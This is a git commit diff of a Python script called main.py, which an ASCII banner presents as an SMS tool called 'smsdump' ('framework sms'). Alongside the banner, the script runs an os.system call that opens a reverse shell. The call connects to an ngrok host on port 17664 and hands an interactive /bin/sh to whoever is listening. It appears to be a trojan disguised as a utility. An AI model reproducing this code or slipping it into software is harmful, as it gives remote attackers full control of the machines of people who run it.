95e978e1f4c68f59acd0bb1990ac0ed437c84efb
spawnn <80365034+SPAWN-cloud@users.noreply.github.com>
2022-06-17 23:41:31 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,18 @@
 import os
+print(f''' 
 
+                        _                       
+                       | |                      
+ ___ _ __ ___  ___   __| |_   _ _ __ ___  _ __  
+/ __| '_ ` _ \/ __| / _` | | | | '_ ` _ \| '_ \ 
+\__ \ | | | | \__ \ |  (_| | |_| | | | | | | |_) 
+|___/_| |_| |_|___/ \__,_|\__,_|_| |_| |_| .__/ 
+                                        | |    
+                                        |_|  
+        coded by spawn
+
+framework sms
+
+
+''')
 os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",17664));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
